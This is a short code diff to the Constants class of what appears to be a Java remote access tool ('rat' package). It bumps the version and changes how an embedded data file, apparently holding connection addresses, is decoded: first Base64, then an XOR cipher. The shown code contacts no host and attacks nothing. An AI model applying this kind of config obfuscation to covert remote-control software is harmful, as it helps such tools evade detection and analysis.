@@ -19,6 +19,7 @@ package de.sogomn.rat.util;
 import java.net.URISyntaxException;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.util.Base64;
 import java.util.ResourceBundle;
 
 import javax.swing.JDialog;
@@ -37,7 +38,7 @@ public final class Constants {
 	
 	private static final String DATA_PATH = "/data";
 	
-	public static final String VERSION = "1.29.1";
+	public static final String VERSION = "1.29.2";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	public static final IOperatingSystemService OS_SERVICE = IOperatingSystemService.getInstance();
 	public static final String[] ADDRESSES;
@@ -45,9 +46,9 @@ public final class Constants {
 	public static final Path JAR_FILE;
 	
 	static {
-		final byte[] data = FileUtils.readInternalData(DATA_PATH);
-		
-		XorCipher.crypt(data);
+		byte[] data = FileUtils.readInternalData(DATA_PATH);
+		data = Base64.getDecoder().decode(data);
+		data = XorCipher.crypt(data);
 		
 		final String text = new String(data);
 		final String[] lines = text.split("\r\n");
